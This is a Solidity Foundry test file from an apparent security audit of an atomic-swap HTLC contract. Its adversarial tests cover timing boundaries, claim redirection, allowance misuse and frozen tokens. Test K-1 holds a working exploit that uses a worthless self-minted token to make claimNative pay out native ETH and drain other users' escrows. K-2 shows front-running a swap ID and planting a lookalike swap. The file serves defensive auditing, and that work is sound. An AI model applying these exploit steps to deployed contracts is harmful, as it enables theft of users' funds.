// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

// Atomic-swap completion audit — adversarial tests against the UNCHANGED
// AtomicSwapHTLCv2 (release/v40000-prep, contracts/atomic-swap/src). Local only.

import {Test} from "forge-std/Test.sol";
import {AtomicSwapHTLCv2} from "atomic-swap/AtomicSwapHTLCv2.sol";

contract Tok {
    string public name = "T"; uint8 public decimals;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    constructor(uint8 d) { decimals = d; }
    function mint(address to, uint256 a) external { balanceOf[to] += a; }
    function approve(address s, uint256 a) external returns (bool) { allowance[msg.sender][s] = a; return true; }
    function transfer(address to, uint256 a) external virtual returns (bool) { balanceOf[msg.sender] -= a; balanceOf[to] += a; return true; }
    function transferFrom(address f, address to, uint256 a) external returns (bool) {
        allowance[f][msg.sender] -= a; balanceOf[f] -= a; balanceOf[to] += a; return true;
    }
}

// token whose transfers can be frozen (models a pausable/blacklisting ERC-20)
contract FreezableTok is Tok {
    bool public frozen;
    constructor() Tok(8) {}
    function freeze() external { frozen = true; }
    function transfer(address to, uint256 a) external override returns (bool) {
        require(!frozen, "FROZEN"); balanceOf[msg.sender] -= a; balanceOf[to] += a; return true;
    }
}

contract AuditHTLCv2 is Test {
    AtomicSwapHTLCv2 h;
    address alice = address(0xA11CE);
    address bob = address(0xB0B);
    address mallory = address(0xBAD);
    bytes32 constant P = 0x000102030405060708090a0b0c0d0e0f101112131415161718191a1b1c1d1e1f;
    bytes32 constant H = 0x630dcd2966c4336691125448bbb25b4ff412a49c732db2c8abc1b8581bd710dd;

    function setUp() public { vm.roll(1000); h = new AtomicSwapHTLCv2(); }

    // E: the EVM hashlock is sha256 over the raw 32 preimage bytes — same vector the
    // SOST node checks in R21 (sha256(payload[0..31])). Vector computed independently (python hashlib).
    function test_E_hash_vector_matches_sost_R21() public pure {
        assertEq(sha256(abi.encodePacked(P)), H);
    }

    // K-1 CRITICAL: claimNative does NOT check s.token == address(0). A claimer of an ERC-20
    // swap (here: a worthless self-minted token, Mallory is locker AND claimer) is paid
    // lockedAmount in NATIVE ETH out of other users' native escrows.
    function test_K1_claimNative_on_erc20_swap_drains_native_escrow() public {
        // victim: Alice escrows 10 ETH for Bob
        vm.deal(alice, 10 ether);
        vm.prank(alice); h.lockNative{value: 10 ether}(keccak256("victim"), sha256(abi.encodePacked(keccak256("x"))), block.number + 100, bob, alice);
        // attacker: worthless 18-dec token, 10e18 units, own secret
        Tok junk = new Tok(18); junk.mint(mallory, 10e18);
        bytes32 s = keccak256("mallory-secret");
        vm.startPrank(mallory);
        junk.approve(address(h), 10e18);
        h.lockERC20(keccak256("evil"), address(junk), 10e18, sha256(abi.encodePacked(s)), block.number + 100, mallory, mallory);
        uint256 before = mallory.balance;
        h.claimNative(keccak256("evil"), s);
        vm.stopPrank();
        assertEq(mallory.balance - before, 10 ether, "attacker received the victim's ETH");
        assertEq(address(h).balance, 0, "native escrow emptied");
        // victim's honest claim now fails
        vm.prank(bob); vm.expectRevert(bytes("SEND_FAILED")); h.claimNative(keccak256("victim"), keccak256("x"));
    }

    // K-2: swapId is caller-chosen. A mempool observer can front-run a lockERC20 with the same id
    // (griefing: the honest lock reverts SWAP_EXISTS). It can also pre-create an id with the SAME
    // hashlock but a different claimer/token/amount — a counterparty that verifies only the id/
    // hashlock would be fooled. Watchers must verify every field.
    function test_K2_swapId_frontrun_and_lookalike() public {
        Tok w = new Tok(8); w.mint(bob, 100e8); w.mint(mallory, 1);
        bytes32 id = keccak256("swap-1");
        vm.startPrank(mallory); w.approve(address(h), 1);
        h.lockERC20(id, address(w), 1, H, block.number + 50, mallory, mallory); vm.stopPrank();
        vm.startPrank(bob); w.approve(address(h), 100e8);
        vm.expectRevert(bytes("SWAP_EXISTS"));
        h.lockERC20(id, address(w), 100e8, H, block.number + 50, alice, bob); vm.stopPrank();
        AtomicSwapHTLCv2.Swap memory s = h.getSwap(id);
        assertEq(s.hashlock, H); assertEq(uint256(s.state), 1);   // looks LOCKED with the right hashlock
        assertEq(s.claimer, mallory); assertEq(s.lockedAmount, 1); // but wrong claimer and amount
    }

    // F/C: boundary — claim allowed at refundTime-1, rejected at refundTime; refund rejected at
    // refundTime-1, allowed at refundTime. No block where both or neither are possible.
    function test_C_boundary_claim_refund() public {
        Tok w = new Tok(8); w.mint(bob, 2e8);
        uint256 rt = block.number + 10;
        vm.startPrank(bob); w.approve(address(h), 2e8);
        h.lockERC20(keccak256("a"), address(w), 1e8, H, rt, alice, bob);
        h.lockERC20(keccak256("b"), address(w), 1e8, H, rt, alice, bob); vm.stopPrank();
        vm.roll(rt - 1);
        vm.prank(bob); vm.expectRevert(bytes("NOT_YET")); h.refundERC20(keccak256("a"));
        vm.prank(alice); h.claimERC20(keccak256("a"), P, 1e8);
        vm.roll(rt);
        vm.prank(alice); vm.expectRevert(bytes("EXPIRED")); h.claimERC20(keccak256("b"), P, 0);
        vm.prank(bob); h.refundERC20(keccak256("b"));
    }

    // K approval race: an allowance granted to the HTLC can only be used by its owner
    // (lockERC20 pulls from msg.sender), never by a third party.
    function test_K_allowance_not_usable_by_third_party() public {
        Tok w = new Tok(8); w.mint(bob, 100e8);
        vm.prank(bob); w.approve(address(h), 100e8);
        vm.prank(mallory); vm.expectRevert();   // mallory has no balance/allowance of her own
        h.lockERC20(keccak256("steal"), address(w), 100e8, H, block.number + 10, mallory, mallory);
        assertEq(w.balanceOf(bob), 100e8);
    }

    // K: claim cannot be redirected — only the recorded claimer can claim (no front-run of a
    // revealed preimage by a mempool observer).
    function test_K_claim_frontrun_by_observer_fails() public {
        Tok w = new Tok(8); w.mint(bob, 1e8);
        vm.startPrank(bob); w.approve(address(h), 1e8);
        h.lockERC20(keccak256("c"), address(w), 1e8, H, block.number + 10, alice, bob); vm.stopPrank();
        vm.prank(mallory); vm.expectRevert(bytes("NOT_CLAIMER")); h.claimERC20(keccak256("c"), P, 0);
    }

    // K: decimals are NOT checked — a lock in a different-decimals token is accepted as-is.
    // An off-chain watcher must compare token address + amount in base units.
    function test_K_decimals_and_token_not_bound() public {
        Tok six = new Tok(6); six.mint(bob, 100e6);
        vm.startPrank(bob); six.approve(address(h), 100e6);
        h.lockERC20(keccak256("d"), address(six), 100e6, H, block.number + 10, alice, bob); vm.stopPrank();
        assertEq(h.getSwap(keccak256("d")).lockedAmount, 100e6);  // "100" of a 6-dec token = 0.000001 of 8-dec units
    }

    // C pause/failure: if the token freezes transfers, neither claim nor refund can move the funds
    // until it unfreezes (HTLC has no pause of its own). WSOST has no transfer pause (mint pause only).
    function test_C_frozen_token_blocks_both_paths() public {
        FreezableTok f = new FreezableTok(); f.mint(bob, 1e8);
        uint256 rt = block.number + 10;
        vm.startPrank(bob); f.approve(address(h), 1e8);
        h.lockERC20(keccak256("e"), address(f), 1e8, H, rt, alice, bob); vm.stopPrank();
        f.freeze();
        vm.prank(alice); vm.expectRevert(bytes("TOKEN_CALL_FAILED")); h.claimERC20(keccak256("e"), P, 0);
        vm.roll(rt);
        vm.prank(bob); vm.expectRevert(bytes("TOKEN_CALL_FAILED")); h.refundERC20(keccak256("e"));
    }

    // Fuzz: claim/refund windows partition the block range exactly.
    function testFuzz_windows_partition(uint64 dt, uint64 at) public {
        dt = uint64(bound(dt, 1, 1_000_000)); at = uint64(bound(at, 0, 2_000_000));
        Tok w = new Tok(8); w.mint(bob, 2e8);
        uint256 rt = block.number + dt;
        vm.startPrank(bob); w.approve(address(h), 2e8);
        h.lockERC20(keccak256("x1"), address(w), 1e8, H, rt, alice, bob);
        h.lockERC20(keccak256("x2"), address(w), 1e8, H, rt, alice, bob); vm.stopPrank();
        vm.roll(block.number + at);
        vm.prank(alice); (bool c,) = address(h).call(abi.encodeCall(h.claimERC20, (keccak256("x1"), P, 0)));
        vm.prank(bob);   (bool r,) = address(h).call(abi.encodeCall(h.refundERC20, (keccak256("x2"))));
        assertTrue(c != r, "exactly one of claim/refund must be possible at any block");
    }
}
